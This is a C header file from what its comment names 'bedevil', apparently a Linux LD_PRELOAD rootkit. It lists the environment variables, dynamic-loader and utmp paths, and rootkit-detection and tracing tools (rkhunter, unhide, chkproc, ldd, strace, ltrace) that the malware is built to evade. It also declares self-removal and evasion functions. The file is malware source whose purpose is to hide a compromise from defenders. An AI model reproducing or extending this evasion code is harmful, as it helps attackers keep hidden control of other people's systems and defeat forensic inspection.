#ifndef EVASION_H
#define EVASION_H

/* bedevil subverts detection from the following */
static char *scary_variables[3] = {"LD_TRACE_LOADED_OBJECTS", "LD_DEBUG", "LD_AUDIT"};

static char *scary_paths[6] = {"*/*ld-linux*.so.*", "*ld-linux*.so.*", "*/*ld-*.so",
                               "*ld-*.so", "*/utmp", "utmp"};

static char *scary_procs[8] = {"lsrootkit", "ldd", "unhide", "rkhunter",
                               "chkproc", "chkdirs", "ltrace", "strace"};

#define SCARY_VARIABLES_SIZE sizeofarray(scary_variables)
#define SCARY_PATHS_SIZE sizeofarray(scary_paths)
#define SCARY_PROCS_SIZE sizeofarray(scary_procs)

#define VINVALID_PERM 0
#define VFORK_ERR    -1
#define VFORK_SUC     2
#define VEVADE_DONE   1
#define VNOTHING_DONE 3

int remove_self(void);
int evade(const char *filename, char *const argv[], char *const envp[]);
#include "evasion.c"

#endif